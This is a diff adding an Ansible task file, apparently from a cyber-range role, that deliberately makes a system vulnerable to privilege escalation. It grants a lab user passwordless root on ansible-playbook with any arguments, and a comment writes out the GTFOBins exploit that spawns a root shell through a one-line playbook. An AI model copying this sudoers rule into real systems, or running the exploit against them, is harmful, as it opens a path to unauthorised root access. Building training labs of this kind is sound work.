@@ -1,0 +1,17 @@
+---
+# GTFOBins: https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo
+# Exploit:
+#   echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /tmp/x
+#   sudo ansible-playbook /tmp/x
+- name: (privesc/sudo_ansible_playbook) Install ansible
+  ansible.builtin.apt:
+    name: ansible
+    state: present
+    update_cache: true
+
+- name: (privesc/sudo_ansible_playbook) Grant sudo on ansible-playbook to privesc user
+  ansible.builtin.copy:
+    dest: "/etc/sudoers.d/privesc_ansible_playbook"
+    content: "{{ ludus_privesc_sudo_user }}@{{ ludus_privesc_sssd_domain }} ALL=(root) NOPASSWD: /usr/bin/ansible-playbook *\n"
+    mode: "0440"
+    validate: "visudo -cf %s"
